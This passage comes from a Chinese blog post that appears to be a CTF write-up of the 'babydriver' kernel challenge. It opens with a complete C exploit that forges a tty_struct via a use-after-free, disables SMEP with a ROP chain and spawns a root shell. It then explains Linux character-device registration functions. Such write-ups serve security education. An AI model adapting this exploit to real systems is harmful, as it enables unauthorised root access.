class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_RDI_RET 0xffffffff810d238d</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_RAX_RET 0xffffffff8100ce6e</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MOV_CR4_RDI_POP_RBP_RET 0xffffffff81004d80</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MOV_RSP_RAX_DEC_EBX_RET 0xffffffff8181bfc5</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SWAPGS_POP_RBP_RET 0xffffffff81063694</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRETQ_RET 0xffffffff814e35ef</span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="literal">NULL</span>, prepare_kernel_cred = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">saveStatus</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">getRootPrivilige</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> * (*prepare_kernel_cred_ptr)(<span class="type">void</span> *) = prepare_kernel_cred;</span><br><span class="line">    <span class="type">int</span> (*commit_creds_ptr)(<span class="type">void</span> *) = commit_creds;</span><br><span class="line">    (*commit_creds_ptr)((*prepare_kernel_cred_ptr)(<span class="literal">NULL</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">getRootShell</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;   </span><br><span class="line">    <span class="keyword">if</span>(getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Start to exploit...\033[0m\n&quot;</span>);</span><br><span class="line">    saveStatus();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//get the addr</span></span><br><span class="line">    FILE* sym_table_fd = fopen(<span class="string">&quot;/proc/kallsyms&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(sym_table_fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to open the sym_table file!\033[0m\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x50</span>], type[<span class="number">0x10</span>];</span><br><span class="line">    <span class="type">size_t</span> addr;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">fscanf</span>(sym_table_fd, <span class="string">&quot;%llx%s%s&quot;</span>, &amp;addr, type, buf))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(prepare_kernel_cred &amp;&amp; commit_creds)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!commit_creds &amp;&amp; !<span class="built_in">strcmp</span>(buf, <span class="string">&quot;commit_creds&quot;</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            commit_creds = addr;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the addr of commit_cread:\033[0m%llx\n&quot;</span>, commit_creds);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(buf, <span class="string">&quot;prepare_kernel_cred&quot;</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            prepare_kernel_cred = addr;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the addr of prepare_kernel_cred:\033[0m%llx\n&quot;</span>, prepare_kernel_cred);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> rop[<span class="number">0x20</span>], p = <span class="number">0</span>;</span><br><span class="line">    rop[p++] = POP_RDI_RET;</span><br><span class="line">    rop[p++] = <span class="number">0x6f0</span>;</span><br><span class="line">    rop[p++] = MOV_CR4_RDI_POP_RBP_RET;</span><br><span class="line">    rop[p++] = <span class="number">0</span>;</span><br><span class="line">    rop[p++] = getRootPrivilige;</span><br><span class="line">    rop[p++] = SWAPGS_POP_RBP_RET;</span><br><span class="line">    rop[p++] = <span class="number">0</span>;</span><br><span class="line">    rop[p++] = IRETQ_RET;</span><br><span class="line">    rop[p++] = getRootShell;</span><br><span class="line">    rop[p++] = user_cs;</span><br><span class="line">    rop[p++] = user_rflags;</span><br><span class="line">    rop[p++] = user_sp;</span><br><span class="line">    rop[p++] = user_ss;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> fake_op[<span class="number">0x30</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; i++)</span><br><span class="line">        fake_op[i] = MOV_RSP_RAX_DEC_EBX_RET;</span><br><span class="line"></span><br><span class="line">    fake_op[<span class="number">0</span>] = POP_RAX_RET;</span><br><span class="line">    fake_op[<span class="number">1</span>] = rop;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> fd1 = open(<span class="string">&quot;/dev/babydev&quot;</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="type">int</span> fd2 = open(<span class="string">&quot;/dev/babydev&quot;</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    ioctl(fd1, <span class="number">0x10001</span>, <span class="number">0x2e0</span>);</span><br><span class="line">    close(fd1);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> fake_tty[<span class="number">0x20</span>];</span><br><span class="line">    <span class="type">int</span> fd3 = open(<span class="string">&quot;/dev/ptmx&quot;</span>, <span class="number">2</span>);</span><br><span class="line">    read(fd2, fake_tty, <span class="number">0x40</span>);<span class="comment">//这一步为什么要read??因为下一步写的时候要从开头写,如果直接填充到ops的话,那么中间很多重要信息就被覆盖了,所以先将原本的信息读出来,等会填充的时候就用这个填充,保证开头到目标之间的内容不被改变</span></span><br><span class="line">    fake_tty[<span class="number">3</span>] = fake_op;</span><br><span class="line">    write(fd2, fake_tty, <span class="number">0x40</span>);</span><br><span class="line"></span><br><span class="line">    write(fd3, buf, <span class="number">0x8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>顺带一提,本题覆盖cr4寄存器取消了smep保护,那么在获得了commint_creds和prepare_kernel_cred的地址后可以直接用户空间代码调用提权,最后着陆用户态spawn一个shell</p><h2 id="延拓"><a href="#延拓" class="headerlink" title="延拓"></a>延拓</h2><h3 id="dev"><a href="#dev" class="headerlink" title="/dev"></a>/dev</h3><p>在Linux系统中，<code>/dev</code> 目录是一个特殊的目录，它包含了设备文件（device files）。设备文件是用于访问系统硬件设备或与内核通信的一种方式。<code>/dev</code> 目录中的设备文件允许用户和应用程序通过文件I/O的方式与硬件设备进行交互，这种文件I/O操作被视为与设备的输入输出（I/O）交互。</p><p>这些设备文件包括以下几类</p><p><strong>字符设备</strong></p><p><em>字符设备</em>是指每次与系统传输1个字符的设备。这些设备节点通常为传真,虚拟终端和串口调制解调器之类设备提供流通信服务，它通常不支持随机存取数据。</p><p>字符设备在实现时，大多不使用缓存器。系统直接从设备读取／写入每一个字符。</p><p><strong>块设备</strong></p><p><em>块设备</em>是指与系统间用块的方式移动数据的设备。这些设备节点通常代表可寻址设备，如硬盘、CD-ROM和内存区域。</p><p>块设备通常支持随机存取和寻址，并使用缓存器。操作系统为输入输出分配了缓存以存储一块数据。当程序向设备发送了读取或者写入数据的请求时，系统把数据中的每一个字符存储在适当的缓存中。当缓存被填满时，会采取适当的操作（把数据传走），而后系统清空缓存。</p><p><strong>伪设备</strong></p><p>在类Unix操作系统中，设备节点并不一定要对应物理设备。没有这种对应关系的设备是<em>伪设备</em>。操作系统运用了它们提供的多种功能。部分经常使用到的伪设备包括：</p><ul><li><p><code>/dev/null</code></p><p>接受并丢弃所有输入；即不产生任何输出。</p></li><li><p><code>/dev/full</code></p><p>永远在被填满状态的设备。</p></li><li><p><code>/dev/loop</code></p><p>Loop设备</p></li><li><p><code>/dev/zero</code></p><p>产生连续的NUL字符的流(数值为0)。</p></li><li><p><code>/dev/random</code></p><p>产生一个虚假随机的任意长度字符流。(Blocking)</p></li><li><p><code>/dev/urandom</code></p><p>产生一个虚假随机的任意长度字符流。(Non-Blocking)</p></li></ul><h3 id="dev-init"><a href="#dev-init" class="headerlink" title="dev_init"></a>dev_init</h3><p>简易分析下babydriver中出现的dev模块注册</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">babydriver_init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// ebx</span></span><br><span class="line">  <span class="class"><span class="keyword">class</span> *<span class="title">v2</span>;</span> <span class="comment">// rax</span></span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">int</span>)alloc_chrdev_region(&amp;babydev_no, <span class="number">0LL</span>, <span class="number">1LL</span>, <span class="string">&quot;babydev&quot;</span>) &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    cdev_init(&amp;cdev_0, &amp;fops);</span><br><span class="line">    cdev_0.owner = &amp;_this_module;</span><br><span class="line">    v1 = cdev_add(&amp;cdev_0, babydev_no, <span class="number">1LL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v1 &gt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = (class *)_class_create(&amp;_this_module, <span class="string">&quot;babydev&quot;</span>, &amp;babydev_no);</span><br><span class="line">      babydev_class = v2;</span><br><span class="line">      <span class="keyword">if</span> ( v2 )</span><br><span class="line">      &#123;</span><br><span class="line">        v3 = device_create(v2, <span class="number">0LL</span>, babydev_no, <span class="number">0LL</span>, <span class="string">&quot;babydev&quot;</span>);</span><br><span class="line">        v0 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v3 )</span><br><span class="line">          <span class="keyword">return</span> v0;</span><br><span class="line">        printk(&amp;unk_351);</span><br><span class="line">        class_destroy(babydev_class);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        printk(&amp;unk_33B);</span><br><span class="line">      &#125;</span><br><span class="line">      cdev_del(&amp;cdev_0);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      printk(&amp;unk_327);</span><br><span class="line">    &#125;</span><br><span class="line">    unregister_chrdev_region(babydev_no, <span class="number">1LL</span>);</span><br><span class="line">    <span class="keyword">return</span> v1;</span><br><span class="line">  &#125;</span><br><span class="line">  printk(&amp;unk_309);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="alloc-chrdev-region"><a href="#alloc-chrdev-region" class="headerlink" title="alloc_chrdev_region"></a>alloc_chrdev_region</h4><p>首先出现的是alloc_chrdev_region函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">alloc_chrdev_region</span><span class="params">(<span class="type">dev_t</span> *dev, <span class="type">unsigned</span> baseminor, <span class="type">unsigned</span> count,</span></span><br><span class="line"><span class="params"><span class="type">const</span> <span class="type">char</span> *name)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">char_device_struct</span> *<span class="title">cd</span>;</span></span><br><span class="line">cd = __register_chrdev_region(<span class="number">0</span>, baseminor, count, name);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(cd))</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(cd);</span><br><span class="line">*dev = MKDEV(cd-&gt;major, cd-&gt;baseminor);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>alloc_chrdev_region</code> 是Linux内核中用于动态分配字符设备号的函数。在Linux系统中，字符设备是一种用于与字符设备驱动程序通信的设备类型，例如终端设备、串口设备等。每个字符设备都有一个唯一的设备号，该设备号由主设备号和次设备号组成。</p><p>参数说明：</p><ul><li><code>dev</code>：用于存储分配的设备号范围的变量（包括主设备号和起始的次设备号）。</li><li><code>baseminor</code>：起始的次设备号。</li><li><code>count</code>：要分配的设备号数量。</li><li><code>name</code>：设备名称，用于在<code>/proc/devices</code>中标识设备。</li></ul><p>对应的逆操作函数是<strong>unregister_chrdev_region</strong></p><h4 id="cdev-init"><a href="#cdev-init" class="headerlink" title="cdev_init"></a>cdev_init</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">cdev_init</span><span class="params">(<span class="keyword">struct</span> cdev *cdev, <span class="type">const</span> <span class="keyword">struct</span> file_operations *fops)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">memset</span>(cdev, <span class="number">0</span>, <span class="keyword">sizeof</span> *cdev);</span><br><span class="line">INIT_LIST_HEAD(&amp;cdev-&gt;<span class="built_in">list</span>);</span><br><span class="line">kobject_init(&amp;cdev-&gt;kobj, &amp;ktype_cdev_default);</span><br><span class="line">cdev-&gt;ops = fops;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>cdev_init</code> 函数的作用是初始化字符设备结构体 <code>cdev</code>。在Linux内核编程中，<code>cdev</code> 结构体代表字符设备，并通过该结构体来向内核注册字符设备。</p><p>参数说明：</p><ul><li><code>cdev</code>：要初始化的字符设备结构体。</li><li><code>fops</code>：与该字符设备关联的文件操作结构体，其中包含了指向驱动程序定义的处理函数的指针</li></ul><h4 id="cdev-add"><a href="#cdev-add" class="headerlink" title="cdev_add"></a>cdev_add</h4><p><code>cdev_add</code> 函数是Linux内核中用于向内核注册字符设备的函数。在使用字符设备时，首先需要创建并初始化 <code>struct cdev</code> 结构体，然后通过 <code>cdev_add</code> 将其注册到内核中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">cdev_add</span><span class="params">(<span class="keyword">struct</span> cdev *p, <span class="type">dev_t</span> dev, <span class="type">unsigned</span> count)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> error;</span><br><span class="line"></span><br><span class="line">p-&gt;dev = dev;</span><br><span class="line">p-&gt;count = count;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (WARN_ON(dev == WHITEOUT_DEV)) &#123;</span><br><span class="line">error = -EBUSY;</span><br><span class="line"><span class="keyword">goto</span> err;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">error = kobj_map(cdev_map, dev, count, <span class="literal">NULL</span>,</span><br><span class="line"> exact_match, exact_lock, p);</span><br><span class="line"><span class="keyword">if</span> (error)</span><br><span class="line"><span class="keyword">goto</span> err;</span><br><span class="line"></span><br><span class="line">kobject_get(p-&gt;kobj.parent);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">err:</span><br><span class="line">kfree_const(p-&gt;kobj.name);</span><br><span class="line">p-&gt;kobj.name = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>参数说明：</p><ul><li><code>p</code>：指向 <code>struct cdev</code> 结构体的指针，表示要注册的字符设备。</li><li><code>dev</code>：字符设备的设备号，包括主设备号和次设备号。</li><li><code>count</code>：设备的数量。通常为1，表示一个设备。</li></ul><p>对应的逆操作函数是<strong>cdev_del</strong></p><h4 id="class-create"><a href="#class-create" class="headerlink" title="_class_create"></a>_class_create</h4><p><code>_class_create</code> 函数是Linux内核中的一个函数，用于创建一个设备类（<code>struct class</code>）,并返回指向 <code>struct class</code> 结构体的指针。设备类是用于组织和管理设备的结构，它提供了一种将相关设备分组的机制，使得用户空间应用程序更容易识别和管理这些设备。</p><p>对应的逆操作函数是<strong>class_destroy</strong></p><h4 id="device-create"><a href="#device-create" class="headerlink" title="device_create"></a>device_create</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> device *<span class="title function_">device_create</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> class *class, <span class="keyword">struct</span> device *parent,</span></span><br><span class="line"><span class="params">     <span class="type">dev_t</span> devt, <span class="type">void</span> *drvdata, <span class="type">const</span> <span class="type">char</span> *fmt, ...)</span></span><br><span class="line">&#123;</span><br><span class="line">va_list vargs;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">device</span> *<span class="title">dev</span>;</span></span><br><span class="line"></span><br><span class="line">va_start(vargs, fmt);</span><br><span class="line">dev = device_create_groups_vargs(class, parent, devt, drvdata, <span class="literal">NULL</span>,</span><br><span class="line">  fmt, vargs);</span><br><span class="line">va_end(vargs);</span><br><span class="line"><span class="keyword">return</span> dev;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL_GPL(device_create)</span><br></pre></td></tr></table></figure><p><code>device_create</code> 函数是 Linux 内核中用于创建字符设备节点（<u>设备文件</u>）的函数。这个函数通常与 <code>class_create</code> 配合使用，用于将字符设备注册到设备类并在 <code>/dev</code> 目录下创建相应的设备节点。</p><p>参数说明：</p><ul><li><code>class</code>：指向 <code>struct class</code> 结构体的指针，表示设备类。</li><li><code>parent</code>：父设备的指针，可以是 <code>NULL</code>。</li><li><code>devt</code>：设备号，包括主设备号和次设备号。</li><li><code>drvdata</code>：指向要关联到设备的私有数据的指针，通常为 <code>NULL</code>。</li><li><code>fmt</code>：用于创建设备节点的格式字符串。</li><li><code>...</code>：用于填充 <code>fmt</code> 字符串中的占位符。</li></ul><p><code>device_create</code> 的主要作用是创建一个字符设备节点，并将其注册到设备类中。通过这个函数，用户空间应用程序可以访问 <code>/dev</code> 目录下的设备节点，以与驱动程序通信。</p><p>对应的逆操作函数是<strong>device_destroy</strong></p><hr><p>看一下两个关键的结构体</p><p><strong>file_operations</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">module</span> *<span class="title">owner</span>;</span></span><br><span class="line"><span class="type">loff_t</span> (*llseek) (<span class="keyword">struct</span> file *, <span class="type">loff_t</span>, <span class="type">int</span>);</span><br><span class="line"><span class="type">ssize_t</span> (*read) (<span class="keyword">struct</span> file *, <span class="type">char</span> __user *, <span class="type">size_t</span>, <span class="type">loff_t</span> *);</span><br><span class="line"><span class="type">ssize_t</span> (*write) (<span class="keyword">struct</span> file *, <span class="type">const</span> <span class="type">char</span> __user *, <span class="type">size_t</span>, <span class="type">loff_t</span> *);</span><br><span class="line"><span class="type">ssize_t</span> (*read_iter) (<span class="keyword">struct</span> kiocb *, <span class="keyword">struct</span> iov_iter *);</span><br><span class="line"><span class="type">ssize_t</span> (*write_iter) (<span class="keyword">struct</span> kiocb *, <span class="keyword">struct</span> iov_iter *);</span><br><span class="line"><span class="type">int</span> (*iopoll)(<span class="keyword">struct</span> kiocb *kiocb, <span class="keyword">struct</span> io_comp_batch *,</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> flags);</span><br><span class="line"><span class="type">int</span> (*iterate_shared) (<span class="keyword">struct</span> file *, <span class="keyword">struct</span> dir_context *);</span><br><span class="line"><span class="type">__poll_t</span> (*poll) (<span class="keyword">struct</span> file *, <span class="keyword">struct</span> poll_table_struct *);</span><br><span class="line"><span class="type">long</span> (*unlocked_ioctl) (<span class="keyword">struct</span> file *, <span class="type">unsigned</span> <span class="type">int</span>, <span class="type">unsigned</span> <span class="type">long</span>);</span><br><span class="line"><span class="type">long</span> (*compat_ioctl) (<span class="keyword">struct</span> file *, <span class="type">unsigned</span> <span class="type">int</span>, <span class="type">unsigned</span> <span class="type">long</span>);</span><br><span class="line"><span class="type">int</span> (*mmap) (<span class="keyword">struct</span> file *, <span class="keyword">struct</span> vm_area_struct *);</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> mmap_supported_flags;</span><br><span class="line"><span class="type">int</span> (*open) (<span class="keyword">struct</span> inode *, <span class="keyword">struct</span> file *);</span><br><span class="line"><span class="type">int</span> (*flush) (<span class="keyword">struct</span> file *, <span class="type">fl_owner_t</span> id);</span><br><span class="line"><span class="type">int</span> (*release) (<span class="keyword">struct</span> inode *, <span class="keyword">struct</span> file *);</span><br><span class="line"><span class="type">int</span> (*fsync) (<span class="keyword">struct</span> file *, <span class="type">loff_t</span>, <span class="type">loff_t</span>, <span class="type">int</span> datasync);</span><br><span class="line"><span class="type">int</span> (*fasync) (<span class="type">int</span>, <span class="keyword">struct</span> file *, <span class="type">int</span>);</span><br><span class="line"><span class="type">int</span> (*lock) (<span class="keyword">struct</span> file *, <span class="type">int</span>, <span class="keyword">struct</span> file_lock *);</span><br><span class="line"><span class="type">unsigned</span> <span class="title function_">long</span> <span class="params">(*get_unmapped_area)</span><span class="params">(<span class="keyword">struct</span> file *, <span class="type">unsigned</span> <span class="type">long</span>, <span class="type">unsigned</span> <span class="type">long</span>, <span class="type">unsigned</span> <span class="type">long</span>, <span class="type">unsigned</span> <span class="type">long</span>)</span>;</span><br><span class="line"><span class="type">int</span> (*check_flags)(<span class="type">int</span>);</span><br><span class="line"><span class="type">int</span> (*flock) (<span class="keyword">struct</span> file *, <span class="type">int</span>, <span class="keyword">struct</span> file_lock *);</span><br><span class="line"><span class="type">ssize_t</span> (*splice_write)(<span class="keyword">struct</span> pipe_inode_info *, <span 